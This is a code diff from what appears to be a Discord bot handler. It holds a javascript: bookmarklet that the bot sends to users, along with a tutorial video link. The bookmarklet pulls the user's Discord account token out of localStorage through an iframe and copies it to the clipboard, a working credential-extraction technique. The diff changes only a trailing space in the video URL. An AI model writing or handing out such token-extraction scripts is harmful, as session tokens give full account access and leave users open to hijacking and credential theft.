@@ -537,7 +537,7 @@ export async function handlePlatformButton(interaction) {
     if (customId === 'btn_android') {
         const androidScript = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>n.style.opacity='1',50);setTimeout(()=>n.style.opacity='0',3500);setTimeout(()=>n.remove(),4000);}catch(e){alert('Error copying token');}})();`;
         
-        const androidVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1541316029718732850/lv_0_20260824110324.mp4?ex=6a8d25e9&is=6a8bd469&hm=7a2d00bbf843271a7af199da483674f24f3f5e21482903574f09f0ab0f6dab02&';
+        const androidVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1541316029718732850/lv_0_20260824110324.mp4?ex=6a8d25e9&is=6a8bd469&hm=7a2d00bbf843271a7af199da483674f24f3f5e21482903574f09f0ab0f6dab02& ';
 
         await interaction.reply({
             content: `\`\`\n${androidScript}\n\`\`\n${androidVideo}`,
